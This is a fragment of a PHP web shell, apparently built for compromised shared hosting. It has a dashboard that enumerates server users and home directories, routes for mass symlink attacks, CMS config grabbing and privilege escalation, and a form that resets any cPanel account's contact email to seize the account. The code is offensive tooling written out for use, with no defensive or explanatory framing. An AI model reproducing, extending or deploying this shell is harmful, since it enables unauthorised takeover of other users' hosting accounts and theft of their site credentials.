    </div>
<?php
// --- ROUTER KONTEN HALAMAN ---
if (isset($_POST['action']) && $_POST['action'] == 'do_reset') {
    $username = $_POST['username'] ?? '';
    $email = $_POST['email'] ?? '';
    if($username && $email) {
        resetCpanelEmail($email, $username);
    } else {
        echo "<div class='terminal-output'><div class='error'>[-] Missing required parameters</div></div>";
    }
}
elseif($action == 'apache_symlink') { createMassSymlinks(); }
elseif($action == 'litespeed_symlink') { createLiteSpeedSymlink(); }
elseif($action == 'grab_config') { showGrabConfigInterface(); }
elseif($action == 'privilege_escalation') { showPrivilegeEscalationInterface(); }
elseif($action == 'scan_results') {
    $results = scanSymlinkResults();
    displayResults($results);
}
elseif($action == 'reset_cpanel') {
    echo "<div class='terminal-output'>";
    echo "<div class='command'>[+] cPanel Reset Utility</div>";
    $users = getAllUsers();
    if (!empty($users)) {
        echo "<div class='output' style='margin-bottom: 15px;'><b class='accent'>[+] Existing User Emails:</b></div>";
        echo "<div class='file-list' style='padding-top:0; padding-bottom:0;'>";
        foreach($users as $username => $homedir) {
            $email = getCurrentCpanelEmail($username);
            echo "<div class='file-item'><strong>$username:</strong> <span class='accent'>$email</span></div>";
        }
        echo "</div>";
    }
    echo "<form method='POST' action='?{$ACCESS_KEY}' style='margin-top:20px;'><input type='hidden' name='action' value='do_reset'><div class='form-group'><label class='form-label'>Target Username</label><input type='text' name='username' class='form-input' placeholder='Enter username' required></div><div class='form-group'><label class='form-label'>New Email</label><input type='email' name='email' class='form-input' placeholder='new@email.com' required></div><button type='submit' class='btn'>Execute Reset</button></form>";
    echo "</div>";
}
else { // Dashboard
    $users = getAllUsers();
    $total_users = count($users);
    echo "<div class='stats'><div class='stat-card'><div class='stat-number'>$total_users</div><div class='stat-label'>REAL USERS</div></div><div class='stat-card'><div class='stat-number'>9+</div><div class='stat-label'>CMS SUPPORTED</div></div><div class='stat-card'><div class='stat-number'>&infin;</div><div class='stat-label'>POSSIBILITIES</div></div></div>";
    echo "<div class='terminal-output'><div class='command'>[+] System Status</div><div class='output'>[+] Server: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') . "</div><div class='output'>[+] PHP: " . phpversion() . "</div><div class='output'>[+] Users Found: $total_users</div></div>";
    if($total_users > 0) {
        echo "<div class='terminal-output'><div class='command'>[+] Recent Users Detected</div>";
        $counter = 0;
        foreach(array_reverse($users, true) as $username => $homedir) {
            if($counter++ >= 10) break;
            echo "<div class='output'>[+] $username => $homedir</div>";
        }
        if($total_users > 10) echo "<div class='output'>[+] ... and " . ($total_users - 10) . " more</div>";
        echo "</div>";
    }
}
?>
</div></body></html>
